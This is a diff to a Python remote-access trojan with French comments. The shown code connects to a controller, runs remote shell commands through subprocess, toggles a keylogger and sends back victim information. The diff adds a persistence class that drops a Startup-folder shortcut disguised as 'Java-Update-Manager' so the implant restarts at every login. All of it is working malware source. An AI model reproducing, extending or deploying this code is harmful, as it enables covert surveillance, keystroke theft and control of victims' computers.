@@ -10,6 +10,7 @@ import win32clipboard
 from win32com.makegw.makegwparse import *
 import threading
 import inspect
+import sys
 
 #pour la compil
 import imp
@@ -75,6 +76,8 @@ class Payload:
         {info[7]}{self.SEPARATOR}{info[8]}{self.SEPARATOR}{info[9]}"
         ClientSocket.send(message.encode())
 
+        pers = Persistance()
+
         ### AJOUTER LE NUMERO DE SESSION DANS LES INFO
 
 
@@ -102,6 +105,8 @@ class Payload:
                     elif self.keylogger_mode == "stop":
                         self.keylogger_mode = "run"
                         output = "Keylogger Activé"
+                elif splited_command[1].lower() == "run" and self.keylogger_mode != "run":
+                    output = "Keylogger déja Activé"
 
                 elif splited_command[1].lower() == "status":
                     ## envoyer retour du keylogger
@@ -117,6 +122,30 @@ class Payload:
                     #thread_keylog.StopThread()
                     output = "Keylogger Desactivé"
             
+            if splited_command[0].lower() == "persistance":
+
+                if splited_command[1].lower() == "auto":
+                    print("Persistance automatique")
+                    output = "Persistance automatique"
+
+                elif splited_command[1].lower() == "startup":
+                    result, code = pers._add_startup_file()
+                    if result == False and code == "deja mise":
+                        print("Persistance via dossier startup déja activé")
+                        output = "Persistance via dossier startup déja activé"
+                    if result == False and code == "error":
+                        print("Persistance via dossier startup a rencontrer une erreur")
+                        output = "Persistance via dossier startup a rencontrer une erreur"
+                    if result == True:
+                        print("Persistance via dossier startup activé")
+                        output = "Persistance via dossier startup activé"
+                    
+                    
+
+                elif splited_command[1].lower() == "powershell":
+                    print("Persistance via powershell")
+                    output = "Persistance via powershell"
+            
             if command.lower() == "exit":
                 # if the command is exit, just break out of the loop
                 break
@@ -130,7 +159,7 @@ class Payload:
                 else:
                     # if operation is successful, empty message
                     output = ""
-            elif splited_command[0].lower() != "keylogger":
+            elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance":
                 # execute the command and retrieve the results
                 resCmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
                 output, err = resCmd.communicate()
@@ -250,6 +279,32 @@ class Keylogger:
                 file.close()
         #pass execution to next hook registered
         return True
+
+class Persistance:
+
+    def _add_startup_file(self, value=None, name='Java-Update-Manager'):
+        try:
+            if os.name == 'nt':
+                value = sys.argv[0]
+                if value and os.path.isfile(value):
+                    appdata = os.path.expandvars("%AppData%")
+                    startup_dir = os.path.join(appdata, r'Microsoft\Windows\Start Menu\Programs\Startup')
+                    if not os.path.exists(startup_dir):
+                        os.makedirs(startup_dir)
+                    startup_file = os.path.join(startup_dir, '%s.eu.url' % name)
+                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % value
+                    if not os.path.exists(startup_file) or content != open(startup_file, 'r').read():
+                        with open(startup_file, 'w') as fp:
+                            print("persis mise")
+                            fp.write(content)
+                    else:
+                        print("persis deja mise")
+                        return (False, "deja mise")
+                    return (True, startup_file)
+        except Exception as e:
+            print('{} error: {}'.format(self._add_startup_file.__name__, str(e)))
+        return (False, "error")
+
 
 class Info:
 
